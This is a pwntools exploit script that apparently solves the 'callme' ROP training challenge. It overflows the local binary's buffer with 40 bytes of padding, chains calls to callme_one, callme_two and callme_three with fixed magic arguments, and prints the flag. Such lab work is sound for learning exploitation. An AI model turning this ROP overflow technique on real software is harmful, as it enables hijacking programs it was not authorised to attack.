from pwn import *

X64_PADDING = 40

elf = context.binary = ELF('callme')
inputs = p64(0xd00df00dd00df00d) + p64(0xcafebabecafebabe) + p64(0xdeadbeefdeadbeef)

callme1 = p64(elf.symbols.callme_one)
callme2 = p64(elf.symbols.callme_two)
callme3 = p64(elf.symbols.callme_three)


rop = ROP(elf)
rop.callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
rop.callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
rop.callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

payload = b"A" * X64_PADDING + rop.chain()
payload += b"B" * (0x100 - len(payload))  # alignment

io = process(elf.path)
io.recvuntil('> ')
io.sendline(payload)
flag = io.recvall()
print(flag)

